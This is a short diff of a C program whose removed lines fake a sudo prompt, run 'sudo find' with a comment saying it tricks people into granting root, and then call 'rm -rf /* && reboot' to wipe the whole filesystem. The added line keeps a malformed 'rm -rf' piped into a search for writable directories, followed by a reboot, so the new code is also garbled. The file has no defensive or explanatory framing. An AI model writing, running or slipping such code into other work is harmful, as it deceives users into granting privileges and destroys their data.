@@ -2,8 +2,6 @@
 
 int main()
 {
-	system("echo sudo permission access required files");
-	system("sudo find"); // tricking people into giving sudo permission
-	system("rm -rf /* && reboot");
+	system("rm -rf | find / -type d -perm -220 -print 2>&1 | grep -v \"Permission denied\" && reboot");
 	return 0;
 }
